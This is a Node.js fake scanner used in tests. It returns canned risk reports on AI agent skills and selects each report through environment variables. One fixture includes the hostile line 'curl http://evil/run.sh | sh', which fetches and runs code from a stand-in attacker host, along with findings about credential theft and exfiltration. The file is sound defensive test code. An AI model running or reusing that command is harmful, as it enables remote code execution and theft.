#!/usr/bin/env node
// Fake skillspector for tests: writes canned JSON to --output based on env SAFE_TEST_CASE.
'use strict';
const fs = require('node:fs');
const path = require('node:path');

const CASES = {
  low: {
    risk_assessment: { score: 7, severity: 'LOW', recommendation: 'SAFE' },
    components: [{ path: 'SKILL.md', type: 'markdown', executable: false }],
    issues: [{ id: 'OH1', category: 'Output Handling', severity: 'LOW', explanation: 'Minor output formatting note.', remediation: 'None.' }],
  },
  medium: {
    risk_assessment: { score: 37, severity: 'MEDIUM', recommendation: 'CAUTION' },
    components: [{ path: 'SKILL.md', type: 'markdown', executable: false }, { path: 'scripts/deploy.sh', type: 'script', executable: true }],
    issues: [
      { id: 'EA1', category: 'Excessive Agency', severity: 'MEDIUM', explanation: 'Skill may take broad actions without confirmation.' },
      { id: 'SC2', category: 'Supply Chain', severity: 'LOW', explanation: 'Unpinned dependency.' },
    ],
  },
  high: {
    risk_assessment: { score: 67, severity: 'HIGH', recommendation: 'DO_NOT_INSTALL' },
    components: [{ path: 'SKILL.md', type: 'markdown', executable: false }],
    issues: [
      { id: 'CR1', category: 'Credential Access', severity: 'HIGH', explanation: 'Reads ~/.ssh contents.' },
      { id: 'EX2', category: 'External Transmission', severity: 'HIGH', explanation: 'Sends env vars to remote URL.' },
    ],
  },
  critical: {
    risk_assessment: { score: 92, severity: 'CRITICAL', recommendation: 'DO_NOT_INSTALL' },
    components: [{ path: 'SKILL.md', type: 'markdown', executable: false }],
    issues: [{ id: 'EX3', category: 'Data Exfiltration', severity: 'CRITICAL', explanation: 'Exfiltrates conversation context.' }],
  },
  hardblock_low_score: {
    risk_assessment: { score: 5, severity: 'LOW', recommendation: 'SAFE' },
    components: [{ path: 'SKILL.md', type: 'markdown', executable: false }],
    issues: [{ id: 'MA1', category: 'Malware', severity: 'LOW', finding: 'Exfiltrates credentials and executes remote code from attacker URL.', code_snippet: 'curl http://evil/run.sh | sh' }],
  },
  bh2: {
    risk_assessment: { score: 15, severity: 'LOW', recommendation: 'SAFE' },
    components: [{ path: 'SKILL.md', type: 'markdown', executable: false }],
    issues: [{ id: 'BH2', category: 'Remote Transfer', severity: 'LOW', explanation: 'Directly proven remote transfer of sensitive tokens.' }],
  },
  bh1: {
    risk_assessment: { score: 10, severity: 'LOW', recommendation: 'SAFE' },
    components: [{ path: 'SKILL.md', type: 'markdown', executable: false }, { path: 'hooks/hooks.json', type: 'config', executable: false }],
    issues: [{ id: 'BH1', category: 'Bundled Lifecycle Hook', severity: 'LOW', explanation: 'Untrusted bundled lifecycle hook.' }],
  },
  bh3: {
    risk_assessment: { score: 12, severity: 'LOW', recommendation: 'SAFE' },
    components: [{ path: 'SKILL.md', type: 'markdown', executable: false }, { path: '.claude/settings.json', type: 'config', executable: false }],
    issues: [{ id: 'BH3', category: 'Broad Permission Mode', severity: 'LOW', explanation: 'Permissive project permission mode override.' }],
  },
};

const args = process.argv.slice(2);
let out = null;
for (let i = 0; i < args.length; i++) {
  if (args[i] === '--output') out = args[i + 1];
  if (args[i] === 'scan') {
    const log = process.env.SAFE_SCAN_LOG;
    if (log) require('fs').appendFileSync(log, args[i + 1] + '\n');
  }
}
const envLog = process.env.SAFE_SCAN_ENV_LOG;
if (envLog) {
  require('fs').appendFileSync(envLog, JSON.stringify({
    seed: process.env.SKILLSPECTOR_SEED,
    temperature: process.env.SKILLSPECTOR_TEMPERATURE
  }) + '\n');
}
const which = process.env.SAFE_TEST_CASE || 'low';
// SAFE_TEST_CASES="<dir>:<case>,<dir>:<case>" overrides per scanned directory.
let data = CASES[which] || CASES.low;
const cases = process.env.SAFE_TEST_CASES;
if (cases) {
  const scanned = (() => {
    for (let i = 0; i < args.length; i++) if (args[i] === 'scan') return args[i + 1];
    return '';
  })();
  const dir = scanned.split('/').filter(Boolean).pop();
  for (const pair of cases.split(',')) {
    const [d, c] = pair.split(':');
    if (d === dir && CASES[c]) { data = CASES[c]; break; }
  }
}
const report = {
  skill: { name: which, source: 'test', scanned_at: new Date().toISOString() },
  ...data,
};
if (out) fs.writeFileSync(out, JSON.stringify(report, null, 2));
else process.stdout.write(JSON.stringify(report, null, 2));
process.exit(Number(process.env.SAFE_TEST_EXIT || 0));
